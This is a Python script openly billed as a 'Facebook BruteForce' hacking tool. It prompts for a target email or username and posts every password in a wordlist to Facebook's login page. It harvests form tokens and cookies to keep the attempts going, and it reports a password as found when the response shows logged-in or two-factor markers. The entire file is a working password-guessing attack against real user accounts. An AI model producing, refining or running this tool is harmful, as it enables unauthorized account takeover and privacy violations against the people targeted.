import os.path
import requests
from bs4 import BeautifulSoup
import sys

if sys.version_info[0] != 3:
    print('''\t--------------------------------------\n\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 
    fb.py\n\t--------------------------------------''')
    sys.exit()

PASSWORD_FILE = "passwords.txt"
MIN_PASSWORD_LENGTH = 6
POST_URL = 'https://www.facebook.com/login.php'
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}
PAYLOAD = {}
COOKIES = {}


def create_form():
    form = dict()
    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}

    data = requests.get(POST_URL, headers=HEADERS)
    for i in data.cookies:
        cookies[i.name] = i.value
    data = BeautifulSoup(data.text, 'html.parser').form
    if data.input['name'] == 'lsd':
        form['lsd'] = data.input['value']
    return form, cookies


def is_this_a_password(email, index, password):
    global PAYLOAD, COOKIES
    if index % 10 == 0:
        PAYLOAD, COOKIES = create_form()
        PAYLOAD['email'] = email
    PAYLOAD['pass'] = password
    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
    if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
        open('temp', 'w').write(str(r.content))
        print('\npassword found is: ', password)
        return True
    return False


if __name__ == "__main__":
    print('\n- \033[38;5;46mWelcome To Facebook BruteForce --\n')
    print('\n-[✓] AUTHOR    \033[1;91m :   SANTU \033[1;92m \n')
    print('\n-[✓] FACEBOOK  \033[1;91m : \033[1;92m SANTU BISWAS \n')
    print('\n-[✓] GITHUB    \033[1;91m :   \033[1;92mSANTUB860 \n')
    print('\n-[✓] TOOL     \033[1;91m  :   \033[1;92mFACEBOOK HACK\n')
    print('\n-[✓] STATUS    \033[1;91m :    \033[1;92mFREE & PAID   \n')
    print('\n- [✓] SYSTEM    \033[1;91m :    \033[1;92mDATA & WIFI       \n')
    print('\n-[✓] VERSION    \033[1;91m:    \033[1;92m    0.1  \n')
    
    if not os.path.isfile(PASSWORD_FILE):
        print("   \033[1;91mPassword file is not exist: ", PASSWORD_FILE)
        sys.exit(0)
    password_data = open(PASSWORD_FILE, 'r').read().split("\n")
    print("   \033[1;91mPassword file selected: ", PASSWORD_FILE)
    email = input('   \033[1;91mEnter Email/Username to target: ').strip()
    for index, password in zip(range(password_data.__len__()), password_data):
        password = password.strip()
        if len(password) < MIN_PASSWORD_LENGTH:
            continue
        print("   \033[1;91mTrying password [", index, "]: ", password)
        if is_this_a_password(email, index, password):
            break
